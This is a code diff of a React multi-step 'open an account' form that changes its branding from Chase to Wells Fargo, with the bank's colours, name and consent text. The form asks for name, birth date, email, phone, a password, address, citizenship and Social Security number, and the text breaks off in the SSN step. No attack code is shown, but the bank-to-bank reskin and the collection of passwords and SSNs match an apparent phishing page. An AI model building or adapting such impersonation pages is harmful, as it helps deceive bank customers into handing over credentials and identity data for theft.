@@ -4,10 +4,310 @@ import {
   Smartphone, ChevronRight, Eye, EyeOff, ShieldCheck,
   Menu, X, PlusCircle,
 } from "lucide-react";
-import octagon from '../assets/octogon-white.avif'
 import { registerApi } from "../api/registerApi";
-import { useNavigate } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 
+/* ─── Wells Fargo Brand Tokens ──────────────────────────────────────────── */
+const WF = {
+  red:       "#D71E28",
+  redDark:   "#A8141C",
+  redLight:  "#F9E5E6",
+  gold:      "#C8972B",
+  goldLight: "#FDF6E7",
+  navy:      "#1A3A5C",
+  navyLight: "#E8EFF7",
+  text:      "#1A1A1A",
+  textMid:   "#4A4A4A",
+  textMuted: "#767676",
+  border:    "#D4D4D4",
+  bg:        "#F5F5F0",
+  white:     "#FFFFFF",
+};
+
+const styles = `
+  @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Source+Sans+3:wght@300;400;500;600&display=swap');
+
+  .wf-root * { box-sizing: border-box; }
+  .wf-root { font-family: 'Source Sans 3', Georgia, sans-serif; background: ${WF.bg}; min-height: 100vh; }
+
+  /* Navbar */
+  .wf-nav {
+    background: ${WF.red};
+    height: 56px; display: flex; align-items: center;
+    padding: 0 24px; justify-content: space-between;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.18);
+  }
+  .wf-nav-logo {
+    display: flex; align-items: center; gap: 10px;
+  }
+  .wf-nav-icon {
+    width: 36px; height: 36px; background: ${WF.white};
+    border-radius: 4px; display: flex; align-items: center;
+    justify-content: center;
+  }
+  .wf-nav-stagecoach {
+    font-family: 'Playfair Display', serif;
+    color: ${WF.red}; font-size: 13px; font-weight: 700;
+    letter-spacing: -0.3px; line-height: 1;
+  }
+  .wf-nav-brand {
+    font-family: 'Playfair Display', serif;
+    color: ${WF.white}; font-size: 17px; font-weight: 700;
+    letter-spacing: 0.2px;
+  }
+  .wf-nav-exit {
+    background: transparent; border: 1.5px solid rgba(255,255,255,0.6);
+    color: ${WF.white}; font-family: 'Source Sans 3', sans-serif;
+    font-size: 13px; font-weight: 600; padding: 5px 16px;
+    border-radius: 3px; cursor: pointer; letter-spacing: 0.3px;
+    transition: background 0.15s;
+  }
+  .wf-nav-exit:hover { background: rgba(255,255,255,0.12); }
+
+  /* Layout */
+  .wf-page { display: flex; justify-content: center; padding: 32px 16px; }
+  .wf-card {
+    width: 100%; max-width: 960px;
+    background: ${WF.white};
+    border: 1px solid ${WF.border};
+    border-radius: 4px;
+    display: flex; flex-direction: row;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.09);
+    overflow: hidden;
+  }
+
+  /* Sidebar */
+  .wf-sidebar {
+    width: 260px; min-width: 260px;
+    background: ${WF.navy};
+    padding: 32px 24px;
+    display: flex; flex-direction: column;
+  }
+  .wf-sidebar-product-label {
+    font-size: 10px; color: rgba(255,255,255,0.55);
+    letter-spacing: 1.5px; text-transform: uppercase;
+    font-weight: 600; margin-bottom: 6px;
+  }
+  .wf-sidebar-product-name {
+    font-family: 'Playfair Display', serif;
+    color: ${WF.white}; font-size: 18px; font-weight: 700;
+    line-height: 1.3; margin-bottom: 24px;
+  }
+  .wf-sidebar-product-name sup {
+    font-size: 10px; vertical-align: super;
+  }
+  .wf-sidebar-offer {
+    display: flex; align-items: center; gap: 8px;
+    background: rgba(200,151,43,0.18);
+    border: 1px solid rgba(200,151,43,0.35);
+    border-radius: 3px; padding: 9px 11px; margin-bottom: 20px;
+  }
+  .wf-sidebar-offer span {
+    color: #F0C060; font-size: 12px; font-weight: 500;
+  }
+  .wf-sidebar-secure {
+    display: flex; gap: 10px; align-items: flex-start;
+    background: rgba(255,255,255,0.07);
+    border-radius: 3px; padding: 11px; margin-bottom: 28px;
+  }
+  .wf-sidebar-secure p {
+    font-size: 11.5px; color: rgba(255,255,255,0.65); line-height: 1.55; margin: 0;
+  }
+  .wf-sidebar-secure strong { color: rgba(255,255,255,0.9); font-weight: 600; }
+  .wf-step-list { display: flex; flex-direction: column; gap: 10px; }
+  .wf-step-item { display: flex; align-items: center; gap: 10px; }
+  .wf-step-dot {
+    width: 26px; height: 26px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; font-weight: 700; flex-shrink: 0;
+    transition: all 0.25s;
+  }
+  .wf-step-dot.done   { background: #4CAF82; color: ${WF.white}; }
+  .wf-step-dot.active { background: ${WF.red}; color: ${WF.white}; box-shadow: 0 0 0 3px rgba(215,30,40,0.25); }
+  .wf-step-dot.future { background: rgba(255,255,255,0.12); color: rgba(255,255,255,0.4); }
+  .wf-step-label { font-size: 12.5px; font-weight: 500; transition: color 0.2s; }
+  .wf-step-label.done   { color: #4CAF82; }
+  .wf-step-label.active { color: ${WF.white}; font-weight: 600; }
+  .wf-step-label.future { color: rgba(255,255,255,0.38); }
+  .wf-sidebar-divider {
+    height: 1px; background: rgba(255,255,255,0.1); margin: 20px 0;
+  }
+
+  /* Progress bar */
+  .wf-progress-wrap { margin-bottom: 28px; }
+  .wf-progress-label {
+    font-size: 12px; color: ${WF.textMuted}; font-weight: 600;
+    letter-spacing: 0.5px; margin-bottom: 8px;
+    text-transform: uppercase;
+  }
+  .wf-progress-track {
+    width: 100%; height: 4px; background: #E8E8E8; border-radius: 2px; overflow: hidden;
+  }
+  .wf-progress-fill {
+    height: 100%; background: ${WF.red};
+    border-radius: 2px; transition: width 0.5s cubic-bezier(.4,0,.2,1);
+  }
+
+  /* Main */
+  .wf-main { flex: 1; padding: 36px 44px; }
+  .wf-step-title {
+    font-family: 'Playfair Display', serif;
+    font-size: 26px; font-weight: 700; color: ${WF.text};
+    margin-bottom: 6px; line-height: 1.25;
+  }
+  .wf-step-sub {
+    font-size: 14px; color: ${WF.textMuted}; margin-bottom: 28px; line-height: 1.6;
+  }
+  .wf-grid-2 {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 12px 28px; margin-bottom: 4px;
+  }
+  .wf-grid-1 { display: grid; grid-template-columns: 1fr; gap: 12px; }
+
+  /* Field */
+  .wf-field { display: flex; flex-direction: column; gap: 4px; }
+  .wf-label {
+    font-size: 12px; font-weight: 600; color: ${WF.textMid};
+    letter-spacing: 0.3px; text-transform: uppercase;
+  }
+  .wf-label.error { color: ${WF.red}; }
+  .wf-label .optional { font-weight: 400; text-transform: none; color: ${WF.textMuted}; letter-spacing: 0; }
+  .wf-input {
+    border: none; border-bottom: 2px solid ${WF.border};
+    background: transparent; outline: none;
+    padding: 9px 0; font-size: 15px; color: ${WF.text};
+    font-family: 'Source Sans 3', sans-serif;
+    transition: border-color 0.15s;
+  }
+  .wf-input::placeholder { color: #BBBBB5; }
+  .wf-input:focus { border-bottom-color: ${WF.red}; }
+  .wf-input.error { border-bottom-color: ${WF.red}; }
+  .wf-select-wrap { position: relative; }
+  .wf-select {
+    width: 100%; border: none; border-bottom: 2px solid ${WF.border};
+    background: transparent; outline: none; padding: 9px 0 9px 0;
+    font-size: 15px; color: ${WF.text}; appearance: none;
+    font-family: 'Source Sans 3', sans-serif; cursor: pointer;
+    transition: border-color 0.15s;
+  }
+  .wf-select:focus { border-bottom-color: ${WF.red}; }
+  .wf-select.error { border-bottom-color: ${WF.red}; }
+  .wf-select-icon { position: absolute; right: 2px; top: 50%; transform: translateY(-50%); pointer-events: none; color: ${WF.textMuted}; }
+  .wf-error-msg { display: flex; align-items: center; gap: 5px; margin-top: 2px; }
+  .wf-error-msg span { font-size: 11.5px; color: ${WF.red}; }
+
+  /* Info box */
+  .wf-info-box {
+    border: 1px solid #E0D8C4; border-left: 3px solid ${WF.gold};
+    border-radius: 3px; padding: 13px 15px; background: ${WF.goldLight};
+    display: flex; gap: 11px; align-items: flex-start;
+  }
+  .wf-info-box p { font-size: 13px; color: #5C4C2A; line-height: 1.6; margin: 0; }
+  .wf-info-box .wf-icon { color: ${WF.gold}; flex-shrink: 0; margin-top: 1px; }
+
+  /* Consent box */
+  .wf-consent-box {
+    border: 1px solid ${WF.border}; border-radius: 3px;
+    padding: 14px 16px; background: #FAFAF8;
+    display: flex; gap: 12px;
+  }
+  .wf-consent-box p { font-size: 12.5px; color: ${WF.textMuted}; line-height: 1.6; margin: 0; }
+
+  /* Radio */
+  .wf-radio-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+  .wf-radio-opt { display: flex; align-items: center; gap: 11px; cursor: pointer; }
+  .wf-radio-circle {
+    width: 20px; height: 20px; border-radius: 50%; border: 2px solid ${WF.border};
+    display: flex; align-items: center; justify-content: center; transition: border-color 0.15s; flex-shrink: 0;
+  }
+  .wf-radio-circle.active { border-color: ${WF.red}; }
+  .wf-radio-dot { width: 10px; height: 10px; border-radius: 50%; background: ${WF.red}; }
+  .wf-radio-label { font-size: 15px; color: ${WF.text}; }
+
+  /* Country box */
+  .wf-country-box {
+    border: 1px solid ${WF.border}; border-radius: 3px;
+    padding: 12px 15px; background: #FAFAF8; margin-bottom: 10px;
+  }
+  .wf-country-box-label { font-size: 10.5px; color: ${WF.textMuted}; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 3px; }
+  .wf-country-box-val { font-size: 15px; font-weight: 600; color: ${WF.text}; }
+
+  /* Buttons */
+  .wf-btn-row { display: flex; justify-content: flex-end; gap: 12px; margin-top: 36px; align-items: center; }
+  .wf-btn-back {
+    background: transparent; border: 2px solid ${WF.navy}; color: ${WF.navy};
+    font-family: 'Source Sans 3', sans-serif; font-size: 14px; font-weight: 600;
+    padding: 10px 28px; border-radius: 3px; cursor: pointer; letter-spacing: 0.3px;
+    transition: all 0.15s;
+  }
+  .wf-btn-back:hover { background: ${WF.navyLight}; }
+  .wf-btn-next {
+    background: ${WF.red}; border: 2px solid ${WF.red}; color: ${WF.white};
+    font-family: 'Source Sans 3', sans-serif; font-size: 14px; font-weight: 600;
+    padding: 10px 36px; border-radius: 3px; cursor: pointer; letter-spacing: 0.3px;
+    transition: all 0.15s;
+  }
+  .wf-btn-next:hover { background: ${WF.redDark}; border-color: ${WF.redDark}; }
+  .wf-btn-next:active { transform: scale(0.98); }
+
+  .wf-text-link {
+    display: flex; align-items: center; gap: 4px;
+    color: ${WF.red}; font-size: 13px; font-weight: 600;
+    background: none; border: none; cursor: pointer; padding: 0;
+    text-decoration: none; margin-top: 14px;
+  }
+  .wf-text-link:hover { text-decoration: underline; }
+
+  .wf-api-error {
+    background: ${WF.redLight}; border: 1px solid #F5B5B8;
+    border-radius: 3px; padding: 12px 16px; margin-top: 16px;
+    display: flex; align-items: center; gap: 8px;
+    font-size: 13px; color: ${WF.redDark};
+  }
+
+  /* Done screen */
+  .wf-done {
+    min-height: 100vh; display: flex; flex-direction: column;
+    background: ${WF.bg};
+  }
+  .wf-done-body {
+    flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px;
+  }
+  .wf-done-card {
+    background: ${WF.white}; border: 1px solid ${WF.border};
+    border-top: 4px solid ${WF.red}; border-radius: 4px;
+    padding: 48px; text-align: center; max-width: 460px; width: 100%;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+  }
+  .wf-done-icon {
+    width: 64px; height: 64px; background: #E8F5EF; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
+  }
+  .wf-done-title {
+    font-family: 'Playfair Display', serif;
+    font-size: 24px; font-weight: 700; color: ${WF.text}; margin-bottom: 10px;
+  }
+  .wf-done-sub { font-size: 14px; color: ${WF.textMuted}; line-height: 1.7; }
+
+  /* SSN reveal */
+  .wf-ssn-wrap { position: relative; display: flex; align-items: center; }
+  .wf-ssn-btn {
+    position: absolute; right: 2px;
+    background: none; border: none; cursor: pointer;
+    color: ${WF.red}; font-size: 13px; font-weight: 600;
+    display: flex; align-items: center; gap: 4px;
+    font-family: 'Source Sans 3', sans-serif;
+  }
+
+  @media (max-width: 700px) {
+    .wf-card { flex-direction: column; }
+    .wf-sidebar { width: 100%; min-width: unset; padding: 20px; }
+    .wf-main { padding: 24px 20px; }
+    .wf-grid-2 { grid-template-columns: 1fr; }
+  }
+`;
+
+/* ─── Constants ─────────────────────────────────────────────────────────── */
 const STEPS = [
   { id: 1, label: "Name",        progress: 18 },
   { id: 2, label: "Birthday",    progress: 34 },
@@ -27,9 +327,7 @@ const US_STATES = [
   "Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia",
   "Wisconsin","Wyoming",
 ];
-
-const SUFFIX_OPTIONS = ["None", "Jr.", "Sr.", "II", "III", "IV", "V"];
-
+const SUFFIX_OPTIONS = ["None","Jr.","Sr.","II","III","IV","V"];
 const COUNTRIES = [
   "United States of America","Afghanistan","Albania","Algeria","Argentina","Armenia",
   "Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Belarus",
@@ -47,79 +345,72 @@ const COUNTRIES = [
   "United Arab Emirates","United Kingdom","Uruguay","Venezuela","Vietnam","Zimbabwe",
 ];
 
-// ── Shared field components ────────────────────────────────────────────────
-
+/* ─── Shared Field Components ───────────────────────────────────────────── */
 function Field({ label, optional, error, children }) {
   return (
-    <div className="flex flex-col gap-1">
-      <label className={`text-sm font-semibold ${error ? "text-red-600" : "text-gray-600"}`}
-        style={{ fontFamily: "sans-serif" }}>
-        {label}{optional && <span className="font-normal text-gray-400"> (optional)</span>}
+    <div className="wf-field">
+      <label className={`wf-label${error ? " error" : ""}`}>
+        {label}{optional && <span className="optional"> (optional)</span>}
       </label>
       {children}
       {error && (
-        <div className="flex items-center gap-1.5 mt-0.5">
-          <AlertCircle size={13} className="text-red-600 shrink-0" />
-          <span className="text-xs text-red-600" style={{ fontFamily: "sans-serif" }}>{error}</span>
+        <div className="wf-error-msg">
+          <AlertCircle size={13} color={WF.red} style={{ flexShrink: 0 }} />
+          <span>{error}</span>
         </div>
       )}
     </div>
   );
 }
 
-function TextInput({ value, onChange, error, placeholder = "", type = "text" }) {
+function TextInput({ value, onChange, error, placeholder = "", type = "text", extra }) {
   return (
-    <input type={type} value={value} onChange={(e) => onChange(e.target.value)}
-      placeholder={placeholder}
-      className={`border-b-2 bg-transparent outline-none py-2 text-gray-900 text-base transition-colors focus:border-blue-700 placeholder-gray-300 ${error ? "border-red-500" : "border-gray-300"}`}
-      style={{ fontFamily: "sans-serif" }} />
+    <input
+      type={type} value={value} placeholder={placeholder}
+      onChange={(e) => onChange(e.target.value)}
+      className={`wf-input${error ? " error" : ""}`}
+      style={extra}
+    />
   );
 }
 
 function SelectInput({ value, onChange, options, error }) {
   return (
-    <div className="relative">
+    <div className="wf-select-wrap">
       <select value={value} onChange={(e) => onChange(e.target.value)}
-        className={`w-full border-b-2 bg-transparent outline-none py-2 pr-8 text-gray-900 text-base appearance-none focus:border-blue-700 cursor-pointer ${error ? "border-red-500" : "border-gray-300"}`}
-        style={{ fontFamily: "sans-serif" }}>
+        className={`wf-select${error ? " error" : ""}`}>
         {options.map((o) => <option key={o} value={o}>{o}</option>)}
       </select>
-      <ChevronDown size={16} className="absolute right-1 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none" />
+      <ChevronDown size={15} className="wf-select-icon" />
     </div>
   );
 }
 
-// ── Navbar ─────────────────────────────────────────────────────────────────
-
+/* ─── Navbar ─────────────────────────────────────────────────────────────── */
 function Navbar() {
   return (
-    <nav className="w-full shadow-md bg-[#005eb8]">
-      <div className=" px-6 flex items-center justify-between h-14">
-        <div className="flex items-center gap-4">
-          <button className="text-white hover:opacity-75 transition-opacity">
-            <Menu size={22} />
-          </button>
-          <img className="w-5 h-5" src={octagon} alt="" /> 
-        </div>
-        <button className="text-white text-sm font-semibold tracking-wide hover:opacity-75 transition-opacity"
-          style={{ fontFamily: "sans-serif" }}>
-          Exit
+    <nav className="wf-nav">
+      <div className="wf-nav-logo">
+        <button style={{ background:"none",border:"none",cursor:"pointer",color:"#fff",display:"flex",alignItems:"center" }}>
+          <Menu size={20} />
         </button>
+        <div className="wf-nav-icon" style={{ marginLeft: 12 }}>
+          <span className="wf-nav-stagecoach">WF</span>
+        </div>
+        <span className="wf-nav-brand" style={{ marginLeft: 10 }}>Wells Fargo</span>
       </div>
+      <Link to="/" className="wf-nav-exit">Exit</Link>
     </nav>
   );
 }
 
-// ── Step 1: Name ───────────────────────────────────────────────────────────
-
+/* ─── Steps ──────────────────────────────────────────────────────────────── */
 function StepName({ data, onChange, errors }) {
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-1 tracking-tight">Let's get to know you</h1>
-      <p className="text-gray-500 text-sm mb-8" style={{ fontFamily: "sans-serif" }}>
-        Tell us your full legal name as it appears on your government ID.
-      </p>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6">
+      <h1 className="wf-step-title">Let's get to know you</h1>
+      <p className="wf-step-sub">Enter your full legal name exactly as it appears on your government-issued ID.</p>
+      <div className="wf-grid-2">
         <Field label="First name" error={errors.firstName}>
           <TextInput value={data.firstName} onChange={(v) => onChange("firstName", v)} error={errors.firstName} />
         </Field>
@@ -137,192 +428,147 @@ function StepName({ data, onChange, errors }) {
   );
 }
 
-// ── Step 2: Birthday ───────────────────────────────────────────────────────
-
 function StepBirthday({ data, onChange, errors }) {
   const handleDateInput = (raw) => {
-    let digits = raw.replace(/\D/g, "").slice(0, 8);
+    let digits = raw.replace(/\D/g,"").slice(0,8);
     let out = digits;
-    if (digits.length > 4) out = digits.slice(0,2) + "/" + digits.slice(2,4) + "/" + digits.slice(4);
-    else if (digits.length > 2) out = digits.slice(0,2) + "/" + digits.slice(2);
+    if (digits.length > 4) out = digits.slice(0,2)+"/"+digits.slice(2,4)+"/"+digits.slice(4);
+    else if (digits.length > 2) out = digits.slice(0,2)+"/"+digits.slice(2);
     onChange("dob", out);
   };
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-1 tracking-tight">When's your birthday?</h1>
-      <p className="text-gray-500 text-sm mb-8" style={{ fontFamily: "sans-serif" }}>
-        You need to be at least 18 years old to apply.
-      </p>
-      <div className="max-w-xs">
+      <h1 className="wf-step-title">When's your birthday?</h1>
+      <p className="wf-step-sub">You must be at least 18 years old to apply for an account.</p>
+      <div style={{ maxWidth: 300 }}>
         <Field label="Date of birth" error={errors.dob}>
-          <div className="relative flex items-center">
-            <input type="text" value={data.dob} onChange={(e) => handleDateInput(e.target.value)}
-              placeholder="mm/dd/yyyy" maxLength={10}
-              className={`w-full border-b-2 bg-transparent outline-none py-2 pr-8 text-gray-900 text-base transition-colors focus:border-blue-700 placeholder-gray-400 ${errors.dob ? "border-red-500" : "border-gray-300"}`}
-              style={{ fontFamily: "sans-serif" }} />
-            <Calendar size={18} className="absolute right-1 text-blue-700 pointer-events-none" />
+          <div className="wf-ssn-wrap">
+            <input type="text" value={data.dob} placeholder="mm/dd/yyyy" maxLength={10}
+              onChange={(e) => handleDateInput(e.target.value)}
+              className={`wf-input${errors.dob ? " error" : ""}`}
+              style={{ paddingRight: 28, width: "100%" }} />
+            <Calendar size={16} style={{ position:"absolute",right:2,color:WF.gold,pointerEvents:"none" }} />
           </div>
-          {!errors.dob && <span className="text-xs text-gray-400 mt-0.5" style={{ fontFamily: "sans-serif" }}>mm/dd/yyyy</span>}
+          {!errors.dob && <span style={{ fontSize:11,color:WF.textMuted }}>mm/dd/yyyy</span>}
         </Field>
       </div>
     </>
   );
 }
-
-// ── Step 3: Contact ────────────────────────────────────────────────────────
 
 function StepContact({ data, onChange, errors }) {
   const [expanded, setExpanded] = useState(false);
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-1 tracking-tight">What's your contact info?</h1>
-      <p className="text-gray-500 text-sm mb-8" style={{ fontFamily: "sans-serif" }}>
-        We'll only use your number to help us service your account.
-      </p>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6 mb-6">
+      <h1 className="wf-step-title">How can we reach you?</h1>
+      <p className="wf-step-sub">We'll use your contact info to service your account and send important updates.</p>
+      <div className="wf-grid-2" style={{ marginBottom: 20 }}>
         <Field label="Email address" error={errors.email}>
-          <TextInput value={data.email} onChange={(v) => onChange("email", v)} error={errors.email} type="email" />
+          <TextInput value={data.email} onChange={(v) => onChange("email",v)} error={errors.email} type="email" />
         </Field>
-        <Field label="Phone number (mobile preferred)" error={errors.phone}>
-          <TextInput value={data.phone} onChange={(v) => onChange("phone", v)} error={errors.phone} placeholder="000-000-0000" />
+        <Field label="Mobile phone number" error={errors.phone}>
+          <TextInput value={data.phone} onChange={(v) => onChange("phone",v)} error={errors.phone} placeholder="000-000-0000" />
         </Field>
         <Field label="Password">
-  <TextInput
-    type="password"
-    value={data.password}
-    onChange={(v) => onChange("password", v)}
-  />
-</Field>
+          <TextInput type="password" value={data.password} onChange={(v) => onChange("password",v)} />
+        </Field>
       </div>
-      <div className="border border-gray-200 rounded-lg p-4 bg-gray-50">
-        <div className="flex gap-3">
-          <Smartphone size={18} className="text-gray-500 shrink-0 mt-0.5" />
-          <div>
-            <p className="text-sm text-gray-600 leading-relaxed" style={{ fontFamily: "sans-serif" }}>
-              By giving us your mobile number, Chase has your consent to send you automated calls and texts to service all of your accounts with us.
-            </p>
-            {expanded && (
-              <p className="text-sm text-gray-500 mt-2 leading-relaxed" style={{ fontFamily: "sans-serif" }}>
-                Message and data rates may apply. You may opt out at any time by texting STOP. Standard message frequency varies. For help, text HELP.
-              </p>
-            )}
-            <button onClick={() => setExpanded(!expanded)}
-              className="flex items-center gap-1 text-blue-700 text-sm font-medium mt-2 hover:underline"
-              style={{ fontFamily: "sans-serif" }}>
-              <ChevronRight size={14} className={`transition-transform ${expanded ? "rotate-90" : ""}`} />
-              {expanded ? "Collapse" : "Please read"}
-            </button>
-          </div>
+      <div className="wf-consent-box">
+        <Smartphone size={17} style={{ color:WF.textMuted, flexShrink:0, marginTop:1 }} />
+        <div>
+          <p>By providing your mobile number, you consent to Wells Fargo sending automated calls and texts to service all of your accounts.</p>
+          {expanded && (
+            <p style={{ marginTop: 8 }}>Message and data rates may apply. You may opt out at any time by texting STOP. Standard message frequency varies. For help, text HELP.</p>
+          )}
+          <button className="wf-text-link" style={{ marginTop: 8 }} onClick={() => setExpanded(!expanded)}>
+            <ChevronRight size={13} style={{ transform: expanded?"rotate(90deg)":"none", transition:"transform 0.2s" }} />
+            {expanded ? "Collapse" : "Read full disclosure"}
+          </button>
         </div>
       </div>
     </>
   );
 }
 
-// ── Step 4: Address ────────────────────────────────────────────────────────
-
 function StepAddress({ data, onChange, errors }) {
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-8 tracking-tight">What's your home address?</h1>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6">
+      <h1 className="wf-step-title">What's your home address?</h1>
+      <div className="wf-grid-2">
         <Field label="Street address" error={errors.street}>
-          <TextInput value={data.street} onChange={(v) => onChange("street", v)} error={errors.street} />
+          <TextInput value={data.street} onChange={(v) => onChange("street",v)} error={errors.street} />
         </Field>
-        <Field label="Suite/apt/other" optional>
-          <TextInput value={data.suite} onChange={(v) => onChange("suite", v)} />
+        <Field label="Suite / Apt / Other" optional>
+          <TextInput value={data.suite} onChange={(v) => onChange("suite",v)} />
         </Field>
         <Field label="City" error={errors.city}>
-          <TextInput value={data.city} onChange={(v) => onChange("city", v)} error={errors.city} />
+          <TextInput value={data.city} onChange={(v) => onChange("city",v)} error={errors.city} />
         </Field>
         <Field label="State" error={errors.state}>
-          <SelectInput value={data.state || "Select state"} onChange={(v) => onChange("state", v)}
-            options={["Select state", ...US_STATES]} error={errors.state} />
+          <SelectInput value={data.state||"Select state"} onChange={(v) => onChange("state",v)}
+            options={["Select state",...US_STATES]} error={errors.state} />
         </Field>
         <Field label="ZIP code" error={errors.zip}>
-          <TextInput value={data.zip} onChange={(v) => onChange("zip", v.replace(/\D/g,"").slice(0,5))} error={errors.zip} />
+          <TextInput value={data.zip} onChange={(v) => onChange("zip",v.replace(/\D/g,"").slice(0,5))} error={errors.zip} />
         </Field>
       </div>
-      <button className="flex items-center gap-1 text-blue-700 text-sm font-medium mt-6 hover:underline"
-        style={{ fontFamily: "sans-serif" }}>
-        <ChevronRight size={14} />
-        Important information if you're a resident of Canada for tax purposes.
+      <button className="wf-text-link">
+        <ChevronRight size={13} />
+        Important information for Canadian tax residents
       </button>
     </>
   );
 }
 
-// ── Step 5: Citizenship ────────────────────────────────────────────────────
-
 function StepCitizenship({ data, onChange, errors }) {
   const [extraCountries, setExtraCountries] = useState([]);
-
-  const addCountry = () => {
-    if (extraCountries.length < 3) setExtraCountries((p) => [...p, "Select country"]);
-  };
-  const removeCountry = (i) => setExtraCountries((p) => p.filter((_, idx) => idx !== i));
-  const updateCountry = (i, v) => setExtraCountries((p) => p.map((c, idx) => idx === i ? v : c));
+  const addCountry = () => { if (extraCountries.length < 3) setExtraCountries(p=>[...p,"Select country"]); };
+  const removeCountry = (i) => setExtraCountries(p=>p.filter((_,idx)=>idx!==i));
+  const updateCountry = (i,v) => setExtraCountries(p=>p.map((c,idx)=>idx===i?v:c));
 
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-6 tracking-tight">Tell us your citizenship status</h1>
-
-      <p className="text-base text-gray-700 mb-3 font-medium" style={{ fontFamily: "sans-serif" }}>
-        Are you a U.S. citizen?
-      </p>
-
-      <div className="flex flex-col gap-3 mb-6">
-        {["Yes", "No"].map((opt) => (
-          <label key={opt} className="flex items-center gap-3 cursor-pointer group"
-            onClick={() => onChange("usCitizen", opt)}
-            style={{ fontFamily: "sans-serif" }}>
-            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-all shrink-0 ${
-              data.usCitizen === opt ? "border-blue-700" : "border-gray-400 group-hover:border-blue-400"
-            }`}>
-              {data.usCitizen === opt && <div className="w-2.5 h-2.5 rounded-full bg-blue-700" />}
+      <h1 className="wf-step-title">Tell us your citizenship status</h1>
+      <p style={{ fontSize:14.5, color:WF.textMid, fontWeight:600, marginBottom:12 }}>Are you a U.S. citizen?</p>
+      <div className="wf-radio-group">
+        {["Yes","No"].map(opt => (
+          <div key={opt} className="wf-radio-opt" onClick={() => onChange("usCitizen",opt)}>
+            <div className={`wf-radio-circle${data.usCitizen===opt?" active":""}`}>
+              {data.usCitizen===opt && <div className="wf-radio-dot" />}
             </div>
-            <span className="text-base text-gray-800">{opt}</span>
-          </label>
+            <span className="wf-radio-label">{opt}</span>
+          </div>
         ))}
       </div>
-
       {errors.usCitizen && (
-        <div className="flex items-center gap-1.5 mb-4">
-          <AlertCircle size={13} className="text-red-600" />
-          <span className="text-xs text-red-600" style={{ fontFamily: "sans-serif" }}>{errors.usCitizen}</span>
+        <div className="wf-error-msg" style={{ marginBottom:12 }}>
+          <AlertCircle size={13} color={WF.red} />
+          <span style={{ fontSize:11.5, color:WF.red }}>{errors.usCitizen}</span>
         </div>
       )}
-
-      {/* Primary country box */}
-      <div className="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
-        <p className="text-xs text-gray-500 mb-1 font-medium" style={{ fontFamily: "sans-serif" }}>Country of citizenship</p>
-        <p className="text-base font-semibold text-gray-900" style={{ fontFamily: "sans-serif" }}>
-          {data.usCitizen === "Yes" ? "United States of America" : "—"}
-        </p>
+      <div className="wf-country-box">
+        <div className="wf-country-box-label">Country of citizenship</div>
+        <div className="wf-country-box-val">
+          {data.usCitizen==="Yes" ? "United States of America" : "—"}
+        </div>
       </div>
-
-      {/* Extra countries */}
       {extraCountries.map((country, i) => (
-        <div key={i} className="border border-gray-200 rounded-lg p-4 mb-3 bg-gray-50">
-          <div className="flex items-start gap-3">
-            <div className="flex-1">
-              <p className="text-xs text-gray-500 mb-2 font-medium" style={{ fontFamily: "sans-serif" }}>
-                Additional country of citizenship
-              </p>
-              <SelectInput value={country} onChange={(v) => updateCountry(i, v)} options={["Select country", ...COUNTRIES]} />
+        <div key={i} className="wf-country-box">
+          <div style={{ display:"flex", alignItems:"flex-start", gap:12 }}>
+            <div style={{ flex:1 }}>
+              <div className="wf-country-box-label">Additional country of citizenship</div>
+              <SelectInput value={country} onChange={(v) => updateCountry(i,v)} options={["Select country",...COUNTRIES]} />
             </div>
-            <button onClick={() => removeCountry(i)} className="text-gray-400 hover:text-red-500 transition-colors mt-5">
-              <X size={16} />
+            <button onClick={() => removeCountry(i)}
+              style={{ background:"none",border:"none",cursor:"pointer",color:WF.textMuted,marginTop:18 }}>
+              <X size={15} />
             </button>
           </div>
         </div>
       ))}
-
       {extraCountries.length < 3 && (
-        <button onClick={addCountry}
-          className="flex items-center gap-2 text-blue-700 text-sm font-semibold hover:underline mt-1"
-          style={{ fontFamily: "sans-serif" }}>
-          <PlusCircle size={16} />
+        <button className="wf-text-link" onClick={addCountry} style={{ marginTop:4 }}>
+          <PlusCircle size={15} />
           Add another country of citizenship
         </button>
       )}
@@ -330,192 +576,145 @@ function StepCitizenship({ data, onChange, errors }) {
   );
 }
 
-// ── Step 6: SSN ────────────────────────────────────────────────────────────
-
 function StepSSN({ data, onChange, errors }) {
   const [show, setShow] = useState(false);
-
   const formatSSN = (raw) => {
-    let digits = raw.replace(/\D/g, "").slice(0, 9);
-    if (digits.length > 5) return digits.slice(0,3) + "-" + digits.slice(3,5) + "-" + digits.slice(5);
-    if (digits.length > 3) return digits.slice(0,3) + "-" + digits.slice(3);
-    return digits;
+    let d = raw.replace(/\D/g,"").slice(0,9);
+    if (d.length > 5) return d.slice(0,3)+"-"+d.slice(3,5)+"-"+d.slice(5);
+    if (d.length > 3) return d.slice(0,3)+"-"+d.slice(3);
+    return d;
   };
-
   return (
     <>
-      <h1 className="text-3xl font-bold text-gray-900 mb-6 tracking-tight">
-        What's your Social Security number?
-      </h1>
-
-      <div className="max-w-sm mb-6">
